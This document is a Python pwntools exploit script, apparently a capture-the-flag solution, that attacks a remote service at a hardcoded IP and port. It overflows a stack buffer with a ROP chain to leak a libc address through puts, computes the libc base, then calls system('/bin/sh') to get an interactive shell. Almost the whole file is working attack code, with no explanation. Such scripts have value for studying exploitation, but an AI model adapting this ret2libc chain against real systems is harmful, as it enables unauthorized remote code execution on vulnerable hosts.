#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
#context.log_level='debug'
loc=0
e=ELF('./chal')

if loc==1:
	p=gdb.debug('./chal', 'b main')
	libc=ELF('./libc.so.6')

else:
	p=remote('134.209.237.231', 4272)
	libc=ELF('./libc.so')

sz=0x80

p.recvline() #stage 1
payload = b'\x00'*(sz+8)
payload+= p64(0x0000000000401253) # pop rdi; ret
payload+= p64(e.got['puts'])
#payload+= p64(e.symbols['puts']) # wrong address which leads to corrupt
payload+= p64(0x401060)
payload+= p64(e.symbols['main']) # for stage 2
p.sendline(payload)
puts=u64(p.recv(6).ljust(8, b'\x00'))
base=puts-libc.symbols['puts']
log.info('puts@libc : {}'.format(hex(puts)))
log.info('libc base : {}'.format(hex(base)))

p.recvline() # stage 2
payload = b'\x00'*(sz+8)
payload+= p64(0x0000000000401254) # ret
payload+= p64(0x0000000000401253) # pop rdi; ret
payload+= p64(base+next(libc.search(b'/bin/sh')))
payload+= p64(base+libc.symbols['system'])
p.sendline(payload)

p.interactive()
p.close()
